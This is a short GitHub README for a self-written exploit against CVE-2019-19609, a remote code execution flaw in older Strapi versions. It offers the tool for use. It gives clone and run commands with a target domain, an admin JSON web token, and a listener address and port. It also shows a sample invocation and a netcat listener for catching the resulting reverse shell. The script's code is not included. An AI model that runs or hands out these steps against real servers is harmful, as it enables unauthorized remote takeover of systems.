# CVE-2019-19609-EXPLOIT
Exploit for CVE-2019-19609 in Strapi (Remote code execution in strapi-3.0.0-beta.17.7 or earlier).<br>
I was faced with a scenario with this vulnerability, but without a public exploit. I decided to create my own and share it here.

<h2>Instalation</h2>

```
git clone https://github.com/diego-tella/CVE-2019-19609-EXPLOIT
```

<h2>Usage</h2>

```
cd CVE-2019-19609-EXPLOIT
python exploit.py -d DOMAIN_OR_IP -jwt JSON_WEB_TOKEN -l LHOST -p LPORT
```

```
python exploit.py -d example.com -jwt eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMwMjU3NDc3LCJleHAiOjE2MzI4NDk0Nzd9.JIKHRz_EDXg1fhThRhIbIyZ9w-6mE01dhnno2AtMMU0 -l 10.10.14.86 -p 1221
```

On another terminal, starts listening to the port passed in the exploit

```
nc -vnlp 1221
```
